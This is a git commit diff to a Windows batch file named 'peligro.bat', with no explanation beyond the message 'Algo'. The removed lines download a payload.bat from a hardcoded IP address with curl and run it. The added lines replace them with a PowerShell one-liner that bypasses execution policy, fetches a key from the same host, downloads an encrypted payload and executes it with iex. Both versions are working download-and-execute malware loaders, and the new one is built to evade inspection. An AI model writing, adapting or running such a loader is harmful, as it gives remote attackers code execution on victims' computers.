d53a211599eff03c40bf715eed5b533f6fcd1d66
AnthonyGrullonA <anthonygrulon283@gmail.com>
2026-04-12 23:37:36 -0400

    Algo

--- peligro.bat
+++ peligro.bat
@@ -1,9 +1,7 @@
 @echo off
-set URL=http://82.29.153.101:5000/payload.bat
-set FILE=%temp%\sc.bat
-
-curl -s -o "%FILE%" "%URL%"
-
-if exist "%FILE%" (
-    start "" "%FILE%"
-)
+powershell -NoProfile -ExecutionPolicy Bypass -Command ^
+"$base='http://82.29.153.101:5000'; ^
+$ts=[int][DateTimeOffset]::UtcNow.ToUnixTimeSeconds(); ^
+$k=(iwr ($base+'/auth/key?ts='+$ts) -UseBasicParsing).Content.Trim(); ^
+$p=iwr ($base+'/payload/encrypted') -Headers @{ 'X-Decrypt-Key'=$k } -UseBasicParsing; ^
+iex $p.Content"
